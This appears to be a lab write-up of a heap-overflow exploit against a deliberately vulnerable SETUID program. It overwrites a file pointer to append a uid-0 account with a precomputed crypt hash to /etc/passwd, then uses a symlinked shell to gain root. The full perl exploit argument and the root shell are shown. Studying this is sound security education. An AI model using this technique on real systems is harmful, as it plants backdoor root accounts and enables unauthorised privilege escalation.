# Adding Root User By Using Heap Overflow

## Assumption

1. '/etc/notes' is owned by 'root'.
2. Program 'victim' is SETUID file and owned by 'root'.

## Blueprint

In victim.c, memory for 'buffer' is allocated first and then memory for 'datafile' is allocated.   
Strcpy() is used for 'buffer' and this program can write something in files which is owned by root!   
So I'll create a root user by writing user_info in '/etc/passwd'.    
>:~$ ./victim 'argument to exploit'

## Procedure

1. User_info format   
  In /etc/passwd...   
  ```
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
  .
  .
  .
  yong:x:1000:1000:yong,,,:/home/yong:/bin/bash
  ```   

  Each field is separated by colon -> login name:password:uid:gid:user name:home directory:login shell   
  Password field is substituted by 'x' because of security.   
  In linux, real value of this field is H(password, salt) where H() is hash and salt is arbitrary two alphabets.   
  And the value is stored in shadow file.   
  If the password of 'yong' is 123456 and salt is "XX", then x is H("123456","XX").    
  By using crypting program 'cryption' attached, we can easily find H("123456", "XX") = XXVgr9a1cu6os.  

  ```
  /* You must link -lcrypt when compiling it*/
  :~$ gcc -o cryption cryption.c -lm -lcrypt
  ```
  So the string which has to be appended in '/etc/passwd' is "myroot:XXVgr9a1cu6os:0:0:USERNAME:/root:/bin/bash".    
  Here we have to focus the first two characters of hash value. It's just the salt we use!    
  So the password for 'myroot' is 123456 and when we enter "123456" for myroot's password, system will check    
  myroot's password field and take "XX" to salt and generate "XXVgr9a1cu6os".   
        
2. Symbolic file link   
  As we can see, the string for user_info should be end with '/bin/bash'(login shell).    
  But to overwrite 'datafile' to '/etc/passwd' by using overflow, argument which is passed to 'victim' should be end with '/etc/passwd'   
  So I'll use symbolic file link to make temp/etc/passwd->bin/bash
  ```
  :~$ mkdir /tmp/etc
  :~$ ln -s /bin/bash /tmp/etc/passwd
  :~$ ls -l /tmp/etc/passwd
  lrwxrwxrwx 1 yong yong 8 4월 16 22:43 /tmp/etc/passwd -> bin/bash
  ```
  Now, we can set loginshell of myroot to /tmp/etc/passwd! 
  
3. Making Command Line Argument
  First of all, we have to calculate the distance between 'buffer' and 'datafile' in victim.c
  In this case, we can easily calculate the distance by executing because this program gives debugging information    
  for buffer and datafile. It isn't realistic....    
  Since command line argument form is    
  
  >"myroot:XXVgr9a1cu6os:0:0:AAAAA........AAAA:/root:/tmp/etc/passwd"    
  
  the length of string from 'myroot' to '/tmp' should be same with the distance between 'buffer' and 'datafile'.   
  Let's assume the number of 'A' is k which satisfing this condition. Then we can add root user by 
  
  >./victim $(perl -e 'print "myroot:XXVgr9a1cu6os:0:0:" . "A" x k . ":/root:/tmp/etc/passwd"')  
  
  ```
  :~$ cat etc/passwd
   root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
  .
  .
  .
  yong:x:1000:1000:yong,,,:/home/yong:/bin/bash
  ?
  myroot:XXVgr9a1cu6os:0:0:AAAAA........AAAA:/root:/tmp/etc/passwd
  ```
  
  ```
  :~$ su myroot
  Password: 123456
  root@yong:/home/yong# whoami
  root
  ```
  
